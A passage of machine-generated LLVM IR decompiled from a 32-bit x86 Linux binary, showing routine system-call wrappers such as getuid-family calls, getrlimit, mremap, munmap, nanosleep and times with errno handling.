  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80532ae, i32* @ebx, align 4
  store i32 %v0_80532ac, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_80533b0, { 1, 0 }
  uselistorder i32 %v2_805339d, { 0, 2, 1 }
  uselistorder i32 %v3_8053357, { 1, 0 }
  uselistorder i32 %v3_8053354, { 1, 2, 0 }
  uselistorder i32 %v2_8053322, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_805332c30, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805336032, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_80533a5, { 2, 3, 0, 1 }
  uselistorder i32 %v5_80532d7, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 17, 0, 18 }
  uselistorder i32 (i16*, i32, i32)* @function_80536ba, { 1, 3, 4, 5, 2, 0 }
  uselistorder i32 19, { 1, 2, 3, 0 }
  uselistorder i32 18, { 1, 2, 3, 0 }
  uselistorder i32 22, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 -12, { 0, 5, 27, 28, 18, 19, 20, 21, 22, 7, 1, 23, 9, 10, 13, 11, 12, 17, 16, 6, 2, 24, 15, 14, 8, 3, 25, 26, 4 }
  uselistorder i32 -8, { 0, 3, 33, 27, 29, 28, 30, 31, 32, 17, 18, 19, 20, 21, 5, 6, 22, 8, 9, 12, 10, 11, 16, 15, 4, 23, 24, 14, 13, 7, 1, 25, 26, 2 }
  uselistorder i32* @esp, { 13, 14, 15, 2, 3, 4, 109, 114, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 5, 6, 77, 89, 90, 41, 42, 43, 44, 45, 46, 16, 78, 79, 80, 0, 81, 82, 83, 84, 85, 86, 87, 88, 72, 73, 74, 75, 76, 17, 1, 18, 19, 20, 21, 57, 58, 59, 60, 61, 52, 53, 54, 55, 56, 115, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 47, 48, 49, 50, 51, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 104, 105, 106, 116, 117, 118, 7, 119, 120, 121, 122, 198, 123, 124, 125, 126, 127, 128, 130, 129, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 107, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 108, 163, 164, 165, 166, 167, 168, 113, 169, 170, 171, 172, 173, 8, 9, 174, 112, 111, 175, 10, 11, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 110, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 12, 197 }
  uselistorder i32 15, { 2, 1, 3, 0 }
  uselistorder i32 -16, { 0, 7, 43, 44, 31, 32, 33, 34, 35, 11, 1, 36, 37, 17, 12, 13, 14, 15, 16, 21, 22, 18, 19, 20, 29, 30, 27, 28, 9, 10, 3, 38, 39, 25, 26, 23, 24, 2, 4, 40, 5, 8, 41, 42, 6 }
  uselistorder i32 30, { 3, 2, 1, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80533b5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80533b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053312, { 1, 0 }
}

define i32 @function_80533bd() local_unnamed_addr {
dec_label_pc_80533bd:
  %stack_var_-8 = alloca i32, align 4
  %v2_80533c0 = ptrtoint i32* %stack_var_-8 to i32
  %v2_80533c7 = call i32 @function_8053467(i32 7, i32 %v2_80533c0)
  store i32 256, i32* @edx, align 4
  %v2_80533d4 = icmp slt i32 %v2_80533c7, 0
  br i1 %v2_80533d4, label %dec_label_pc_80533dc, label %dec_label_pc_80533d8

dec_label_pc_80533d8:                             ; preds = %dec_label_pc_80533bd
  %v3_80533d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80533d8, i32* @edx, align 4
  br label %dec_label_pc_80533dc

dec_label_pc_80533dc:                             ; preds = %dec_label_pc_80533bd, %dec_label_pc_80533d8
  %v0_80533dc = phi i32 [ 256, %dec_label_pc_80533bd ], [ %v3_80533d8, %dec_label_pc_80533d8 ]
  ret i32 %v0_80533dc

; uselistorder directives
  uselistorder i32 7, { 3, 0, 4, 1, 2, 6, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_80533dc, { 1, 0 }
}

define i32 @function_80533e2() local_unnamed_addr {
dec_label_pc_80533e2:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80533e2 = load i32, i32* @ebx, align 4
  store i32 %v0_80533e2, i32* %stack_var_-4, align 4
  %v1_80533eb = call i32 @int80_syscall(i32 202)
  store i32 %v1_80533eb, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80533eb, -4095
  br i1 %tmp7, label %dec_label_pc_8053402, label %dec_label_pc_80533f6

dec_label_pc_80533f6:                             ; preds = %dec_label_pc_80533e2
  %v1_80533f6 = call i32 @function_805149b(i32 %v0_80533e2)
  %v0_80533fb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533fb = sub i32 0, %v0_80533fb
  %v2_80533fd = inttoptr i32 %v1_80533f6 to i32*
  store i32 %v1_80533fb, i32* %v2_80533fd, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053406.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053402

dec_label_pc_8053402:                             ; preds = %dec_label_pc_80533e2, %dec_label_pc_80533f6
  %v2_8053406 = phi i32 [ %v0_80533e2, %dec_label_pc_80533e2 ], [ %v2_8053406.pre, %dec_label_pc_80533f6 ]
  %v0_8053402 = phi i32 [ %v1_80533eb, %dec_label_pc_80533e2 ], [ -1, %dec_label_pc_80533f6 ]
  store i32 %v2_8053406, i32* @ebx, align 4
  ret i32 %v0_8053402

; uselistorder directives
  uselistorder i32 %v1_80533eb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053402, { 1, 0 }
}

define i32 @function_8053408() local_unnamed_addr {
dec_label_pc_8053408:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053408 = load i32, i32* @ebx, align 4
  store i32 %v0_8053408, i32* %stack_var_-4, align 4
  %v1_8053411 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8053411, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053411, -4095
  br i1 %tmp7, label %dec_label_pc_8053428, label %dec_label_pc_805341c

dec_label_pc_805341c:                             ; preds = %dec_label_pc_8053408
  %v1_805341c = call i32 @function_805149b(i32 %v0_8053408)
  %v0_8053421 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053421 = sub i32 0, %v0_8053421
  %v2_8053423 = inttoptr i32 %v1_805341c to i32*
  store i32 %v1_8053421, i32* %v2_8053423, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805342c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053428

dec_label_pc_8053428:                             ; preds = %dec_label_pc_8053408, %dec_label_pc_805341c
  %v2_805342c = phi i32 [ %v0_8053408, %dec_label_pc_8053408 ], [ %v2_805342c.pre, %dec_label_pc_805341c ]
  %v0_8053428 = phi i32 [ %v1_8053411, %dec_label_pc_8053408 ], [ -1, %dec_label_pc_805341c ]
  store i32 %v2_805342c, i32* @ebx, align 4
  ret i32 %v0_8053428

; uselistorder directives
  uselistorder i32 %v1_8053411, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053428, { 1, 0 }
}

define i32 @function_805342e() local_unnamed_addr {
dec_label_pc_805342e:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805342e = load i32, i32* @ebx, align 4
  store i32 %v0_805342e, i32* %stack_var_-4, align 4
  %v1_8053437 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8053437, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053437, -4095
  br i1 %tmp7, label %dec_label_pc_805344e, label %dec_label_pc_8053442

dec_label_pc_8053442:                             ; preds = %dec_label_pc_805342e
  %v1_8053442 = call i32 @function_805149b(i32 %v0_805342e)
  %v0_8053447 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053447 = sub i32 0, %v0_8053447
  %v2_8053449 = inttoptr i32 %v1_8053442 to i32*
  store i32 %v1_8053447, i32* %v2_8053449, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053452.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805344e

dec_label_pc_805344e:                             ; preds = %dec_label_pc_805342e, %dec_label_pc_8053442
  %v2_8053452 = phi i32 [ %v0_805342e, %dec_label_pc_805342e ], [ %v2_8053452.pre, %dec_label_pc_8053442 ]
  %v0_805344e = phi i32 [ %v1_8053437, %dec_label_pc_805342e ], [ -1, %dec_label_pc_8053442 ]
  store i32 %v2_8053452, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805344e

; uselistorder directives
  uselistorder i32 %v1_8053437, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805344e, { 1, 0 }
}

define i32 @function_8053454() local_unnamed_addr {
dec_label_pc_8053454:
  %v0_8053454 = load i32, i32* @global_var_8055144.63, align 4
  %v1_805345e = icmp eq i32 %v0_8053454, 0
  %.v0_8053454 = select i1 %v1_805345e, i32 4096, i32 %v0_8053454
  store i32 %.v0_8053454, i32* @edx, align 4
  ret i32 %.v0_8053454

; uselistorder directives
  uselistorder i32 4096, { 0, 2, 3, 1 }
}

define i32 @function_8053467(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053467:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053467 = load i32, i32* @ebx, align 4
  store i32 %v0_8053467, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805347a = call i32 @int80_syscall(i32 191)
  store i32 %v1_805347a, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_805347a, -4095
  br i1 %tmp9, label %dec_label_pc_8053493, label %dec_label_pc_8053487

dec_label_pc_8053487:                             ; preds = %dec_label_pc_8053467
  %v1_8053487 = call i32 @function_805149b(i32 %v0_8053467)
  %v0_805348c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805348c = sub i32 0, %v0_805348c
  %v2_805348e = inttoptr i32 %v1_8053487 to i32*
  store i32 %v1_805348c, i32* %v2_805348e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053497.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053493

dec_label_pc_8053493:                             ; preds = %dec_label_pc_8053467, %dec_label_pc_8053487
  %v2_8053497 = phi i32 [ %v0_8053467, %dec_label_pc_8053467 ], [ %v2_8053497.pre, %dec_label_pc_8053487 ]
  %v0_8053493 = phi i32 [ %v1_805347a, %dec_label_pc_8053467 ], [ -1, %dec_label_pc_8053487 ]
  store i32 %v2_8053497, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053493

; uselistorder directives
  uselistorder i32 %v1_805347a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053493, { 1, 0 }
}

define i32 @function_8053499() local_unnamed_addr {
dec_label_pc_8053499:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053499 = load i32, i32* @ebx, align 4
  store i32 %v0_8053499, i32* %stack_var_-4, align 4
  %v1_80534a2 = call i32 @int80_syscall(i32 199)
  store i32 %v1_80534a2, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80534a2, -4095
  br i1 %tmp7, label %dec_label_pc_80534b9, label %dec_label_pc_80534ad

dec_label_pc_80534ad:                             ; preds = %dec_label_pc_8053499
  %v1_80534ad = call i32 @function_805149b(i32 %v0_8053499)
  %v0_80534b2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80534b2 = sub i32 0, %v0_80534b2
  %v2_80534b4 = inttoptr i32 %v1_80534ad to i32*
  store i32 %v1_80534b2, i32* %v2_80534b4, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80534bd.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80534b9

dec_label_pc_80534b9:                             ; preds = %dec_label_pc_8053499, %dec_label_pc_80534ad
  %v2_80534bd = phi i32 [ %v0_8053499, %dec_label_pc_8053499 ], [ %v2_80534bd.pre, %dec_label_pc_80534ad ]
  %v0_80534b9 = phi i32 [ %v1_80534a2, %dec_label_pc_8053499 ], [ -1, %dec_label_pc_80534ad ]
  store i32 %v2_80534bd, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80534b9

; uselistorder directives
  uselistorder i32 %v1_80534a2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80534b9, { 1, 0 }
}

define i32 @function_80534bf(i32 %arg1) local_unnamed_addr {
dec_label_pc_80534bf:
  %esi.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_80534d5 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80534d5, i32* %esi.global-to-local, align 4
  %v1_80534ec = call i32 @int80_syscall(i32 140)
  store i32 %v1_80534ec, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_80534ec, -4095
  br i1 %tmp18, label %dec_label_pc_8053506, label %dec_label_pc_80534f8

dec_label_pc_80534f8:                             ; preds = %dec_label_pc_80534bf
  %v2_80534d9 = ashr i32 %tmp8, 31
  %v1_80534f8 = call i32 @function_805149b(i32 %v2_80534d9)
  %v0_80534fd = load i32, i32* %esi.global-to-local, align 4
  %v1_80534fd = sub i32 0, %v0_80534fd
  %v2_80534ff = inttoptr i32 %v1_80534f8 to i32*
  store i32 %v1_80534fd, i32* %v2_80534ff, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805350a

dec_label_pc_8053506:                             ; preds = %dec_label_pc_80534bf
  %v1_8053506 = icmp eq i32 %v1_80534ec, 0
  br i1 %v1_8053506, label %dec_label_pc_805350f, label %dec_label_pc_805350a

dec_label_pc_805350a:                             ; preds = %dec_label_pc_8053506, %dec_label_pc_80534f8
  %v0_805350a = phi i32 [ %v1_80534ec, %dec_label_pc_8053506 ], [ -1, %dec_label_pc_80534f8 ]
  br label %dec_label_pc_8053517

dec_label_pc_805350f:                             ; preds = %dec_label_pc_8053506
  %v3_805350f = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8053517

dec_label_pc_8053517:                             ; preds = %dec_label_pc_805350a, %dec_label_pc_805350f
  %v0_805351d = phi i32 [ %v0_805350a, %dec_label_pc_805350a ], [ %v3_805350f, %dec_label_pc_805350f ]
  ret i32 %v0_805351d

; uselistorder directives
  uselistorder i32 %v1_80534ec, { 1, 2, 0, 3 }
  uselistorder i32 31, { 5, 3, 0, 1, 4, 2, 6, 7 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053517, { 1, 0 }
}

define i32 @function_805351e(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_805351e:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805351f = load i32, i32* @esi, align 4
  store i32 %v0_805351f, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8053537 = load i32, i32* @ebx, align 4
  %v5_805353f = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_805353f = ptrtoint i32* %v5_805353f to i32
  store i32 %v0_8053537, i32* @ebx, align 4
  store i32 %v6_805353f, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_805353f, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_805354b, label %dec_label_pc_8053557

dec_label_pc_805354b:                             ; preds = %dec_label_pc_805351e
  %v1_805354b = call i32 @function_805149b(i32 %v0_8053537)
  %v0_8053550 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053550 = sub i32 0, %v0_8053550
  %v2_8053552 = inttoptr i32 %v1_805354b to i32*
  store i32 %v1_8053550, i32* %v2_8053552, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805355a.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053557

dec_label_pc_8053557:                             ; preds = %dec_label_pc_805351e, %dec_label_pc_805354b
  %v2_805355a = phi i32 [ %v0_805351f, %dec_label_pc_805351e ], [ %v2_805355a.pre, %dec_label_pc_805354b ]
  %v0_8053557 = phi i32 [ %v6_805353f, %dec_label_pc_805351e ], [ -1, %dec_label_pc_805354b ]
  store i32 %v2_805355a, i32* @esi, align 4
  ret i32 %v0_8053557

; uselistorder directives
  uselistorder i32 %v0_8053537, { 1, 0 }
  uselistorder label %dec_label_pc_8053557, { 1, 0 }
}

define i32 @function_805355d(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805355d:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805355d = load i32, i32* @ebx, align 4
  store i32 %v0_805355d, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8053570 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8053570, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8053570, -4095
  br i1 %tmp10, label %dec_label_pc_8053589, label %dec_label_pc_805357d

dec_label_pc_805357d:                             ; preds = %dec_label_pc_805355d
  %v1_805357d = call i32 @function_805149b(i32 %v0_805355d)
  %v0_8053582 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053582 = sub i32 0, %v0_8053582
  %v2_8053584 = inttoptr i32 %v1_805357d to i32*
  store i32 %v1_8053582, i32* %v2_8053584, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805358d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053589

dec_label_pc_8053589:                             ; preds = %dec_label_pc_805355d, %dec_label_pc_805357d
  %v2_805358d = phi i32 [ %v0_805355d, %dec_label_pc_805355d ], [ %v2_805358d.pre, %dec_label_pc_805357d ]
  %v0_8053589 = phi i32 [ %v3_8053570, %dec_label_pc_805355d ], [ -1, %dec_label_pc_805357d ]
  %v2_805358b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805358b, i32* @edx, align 4
  store i32 %v2_805358d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053589

; uselistorder directives
  uselistorder i32 %v3_8053570, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053589, { 1, 0 }
}

define i32 @function_805358f(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805358f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_805358f = load i32, i32* @ebx, align 4
  store i32 %v0_805358f, i32* %stack_var_-4, align 4
  %v4_8053593 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8053593, i32* %ebx.global-to-local, align 4
  %v6_80535a2 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_80535a2, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_80535a2, -4095
  br i1 %tmp11, label %dec_label_pc_80535bb, label %dec_label_pc_80535af

dec_label_pc_80535af:                             ; preds = %dec_label_pc_805358f
  %v1_80535af = call i32 @function_805149b(i32 %v0_805358f)
  %v0_80535b4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80535b4 = sub i32 0, %v0_80535b4
  %v2_80535b6 = inttoptr i32 %v1_80535af to i32*
  store i32 %v1_80535b4, i32* %v2_80535b6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80535bf.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80535bb

dec_label_pc_80535bb:                             ; preds = %dec_label_pc_805358f, %dec_label_pc_80535af
  %v2_80535bf = phi i32 [ %v0_805358f, %dec_label_pc_805358f ], [ %v2_80535bf.pre, %dec_label_pc_80535af ]
  %v0_80535bb = phi i32 [ %v6_80535a2, %dec_label_pc_805358f ], [ -1, %dec_label_pc_80535af ]
  store i32 %v2_80535bf, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80535bb

; uselistorder directives
  uselistorder i32 %v6_80535a2, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80535bb, { 1, 0 }
}

define i32 @function_80535c1(i32 %arg1) local_unnamed_addr {
dec_label_pc_80535c1:
  %stack_var_-12 = alloca i32, align 4
  %v0_80535c2 = load i32, i32* @ebx, align 4
  %v0_80535c6 = load i32, i32* @global_var_8055158.70, align 8
  %v1_80535c6 = icmp eq i32 %v0_80535c6, 0
  %v1_80535d1 = icmp eq i1 %v1_80535c6, false
  br i1 %v1_80535d1, label %dec_label_pc_80535e4, label %dec_label_pc_80535d3

dec_label_pc_80535d3:                             ; preds = %dec_label_pc_80535c1
  %v1_80535d8 = call i32 @function_805379f(i32 0)
  %v2_80535e0 = icmp slt i32 %v1_80535d8, 0
  br i1 %v2_80535e0, label %dec_label_pc_8053606, label %dec_label_pc_80535d3.dec_label_pc_80535e4_crit_edge

dec_label_pc_80535d3.dec_label_pc_80535e4_crit_edge: ; preds = %dec_label_pc_80535d3
  %v0_80535e6.pre = load i32, i32* @global_var_8055158.70, align 8
  br label %dec_label_pc_80535e4

dec_label_pc_80535e4:                             ; preds = %dec_label_pc_80535d3.dec_label_pc_80535e4_crit_edge, %dec_label_pc_80535c1
  %v0_80535f4 = phi i32 [ %v0_80535e6.pre, %dec_label_pc_80535d3.dec_label_pc_80535e4_crit_edge ], [ %v0_80535c6, %dec_label_pc_80535c1 ]
  %v1_80535e4 = icmp eq i32 %arg1, 0
  %v1_80535eb = icmp eq i1 %v1_80535e4, false
  store i32 %v0_80535f4, i32* @ebx, align 4
  br i1 %v1_80535eb, label %dec_label_pc_80535f1, label %dec_label_pc_8053609

dec_label_pc_80535f1:                             ; preds = %dec_label_pc_80535e4
  %v2_80535f6 = add i32 %v0_80535f4, %arg1
  %v1_80535fa = call i32 @function_805379f(i32 %v2_80535f6)
  %v2_8053602 = icmp slt i32 %v1_80535fa, 0
  %v1_8053604 = icmp eq i1 %v2_8053602, false
  br i1 %v1_8053604, label %dec_label_pc_80535f1.dec_label_pc_8053609_crit_edge, label %dec_label_pc_8053606

dec_label_pc_80535f1.dec_label_pc_8053609_crit_edge: ; preds = %dec_label_pc_80535f1
  %v0_8053609.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053609

dec_label_pc_8053606:                             ; preds = %dec_label_pc_80535f1, %dec_label_pc_80535d3
  br label %dec_label_pc_8053609

dec_label_pc_8053609:                             ; preds = %dec_label_pc_80535e4, %dec_label_pc_80535f1.dec_label_pc_8053609_crit_edge, %dec_label_pc_8053606
  %v0_8053609 = phi i32 [ %v0_8053609.pre, %dec_label_pc_80535f1.dec_label_pc_8053609_crit_edge ], [ -1, %dec_label_pc_8053606 ], [ %v0_80535f4, %dec_label_pc_80535e4 ]
  %v2_805360b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805360b, i32* @edx, align 4
  store i32 %v0_80535c2, i32* @ebx, align 4
  ret i32 %v0_8053609

; uselistorder directives
  uselistorder i32 %v0_80535f4, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_805379f, { 1, 0 }
  uselistorder label %dec_label_pc_8053609, { 2, 1, 0 }
}

define i32 @function_805360f(%tms* %arg1) local_unnamed_addr {
dec_label_pc_805360f:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805360f = load i32, i32* @edi, align 4
  store i32 %v0_805360f, i32* %stack_var_-4, align 4
  %v4_8053613 = ptrtoint %tms* %arg1 to i32
  store i32 %v4_8053613, i32* %edi.global-to-local, align 4
  %v0_8053617 = load i32, i32* @ebx, align 4
  %v3_805361f = call i32 @times(%tms* %arg1)
  store i32 %v3_805361f, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_805361f, -4095
  br i1 %tmp9, label %dec_label_pc_8053637, label %dec_label_pc_805362b

dec_label_pc_805362b:                             ; preds = %dec_label_pc_805360f
  %v1_805362b = call i32 @function_805149b(i32 %v0_8053617)
  %v0_8053630 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053630 = sub i32 0, %v0_8053630
  %v2_8053632 = inttoptr i32 %v1_805362b to i32*
  store i32 %v1_8053630, i32* %v2_8053632, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805363b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053637

dec_label_pc_8053637:                             ; preds = %dec_label_pc_805360f, %dec_label_pc_805362b
  %v2_805363b = phi i32 [ %v0_805360f, %dec_label_pc_805360f ], [ %v2_805363b.pre, %dec_label_pc_805362b ]
  %v0_8053637 = phi i32 [ %v3_805361f, %dec_label_pc_805360f ], [ -1, %dec_label_pc_805362b ]
  store i32 %v2_805363b, i32* %edi.global-to-local, align 4
  ret i32 %v0_8053637

; uselistorder directives
  uselistorder i32 %v3_805361f, { 1, 0, 2 }
  uselistorder i32* @edi, { 10, 11, 12, 13, 14, 15, 138, 2, 139, 146, 36, 46, 47, 48, 49, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 3, 4, 5, 6, 7, 8, 9, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27, 28, 29, 30, 144, 145, 31, 32, 33, 34, 35, 51, 52, 53, 54, 55, 56, 104, 57, 58, 59, 105, 106, 140, 141, 142, 143, 107, 108, 109, 110, 137, 97, 98, 99, 66, 67, 68, 69, 70, 91, 92, 93, 94, 95, 96, 88, 89, 90, 60, 61, 62, 63, 64, 79, 80, 81, 76, 77, 78, 112, 113, 114, 111, 115, 116, 117, 100, 101, 71, 65, 72, 73, 74, 75, 82, 83, 84, 85, 86, 87, 102, 103, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 1, 129, 130, 131, 132, 133, 134, 135, 136 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053637, { 1, 0 }
}

define i32 @function_805363d(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805363d:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805363e = load i32, i32* @ebx, align 4
  store i32 %v0_805363e, i32* %stack_var_-8, align 4
  %v4_8053642 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053642, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_805364f = inttoptr i32 %arg2 to i8*
  %v4_805364f = call i32 @function_80514ec(i8* %v3_805364f, i32 0, i32 88)
  store i32 %v4_805364f, i32* %eax.global-to-local, align 4
  %v2_8053654 = load i16, i16* %arg1, align 2
  %v3_8053654 = zext i16 %v2_8053654 to i32
  store i32 %v3_8053654, i32* %eax.global-to-local, align 4
  %v0_8053657 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053657 = add i32 %v0_8053657, 4
  %v2_8053657 = inttoptr i32 %v1_8053657 to i32*
  store i32 0, i32* %v2_8053657, align 4
  %v0_805365e = load i32, i32* %eax.global-to-local, align 4
  %v1_805365e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805365e = inttoptr i32 %v1_805365e to i32*
  store i32 %v0_805365e, i32* %v2_805365e, align 4
  %v0_8053660 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053660 = add i32 %v0_8053660, 4
  %v2_8053660 = inttoptr i32 %v1_8053660 to i32*
  %v3_8053660 = load i32, i32* %v2_8053660, align 4
  store i32 %v3_8053660, i32* %eax.global-to-local, align 4
  %v1_8053663 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053663 = add i32 %v1_8053663, 12
  %v3_8053663 = inttoptr i32 %v2_8053663 to i32*
  store i32 %v3_8053660, i32* %v3_8053663, align 4
  %v0_8053666 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053666 = add i32 %v0_8053666, 8
  %v2_8053666 = inttoptr i32 %v1_8053666 to i16*
  %v3_8053666 = load i16, i16* %v2_8053666, align 2
  %v4_8053666 = zext i16 %v3_8053666 to i32
  store i32 %v4_8053666, i32* %eax.global-to-local, align 4
  %v1_805366a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805366a = add i32 %v1_805366a, 16
  %v3_805366a = inttoptr i32 %v2_805366a to i32*
  store i32 %v4_8053666, i32* %v3_805366a, align 4
  %v0_805366d = load i32, i32* %esi.global-to-local, align 4
  %v1_805366d = add i32 %v0_805366d, 10
  %v2_805366d = inttoptr i32 %v1_805366d to i16*
  %v3_805366d = load i16, i16* %v2_805366d, align 2
  %v4_805366d = zext i16 %v3_805366d to i32
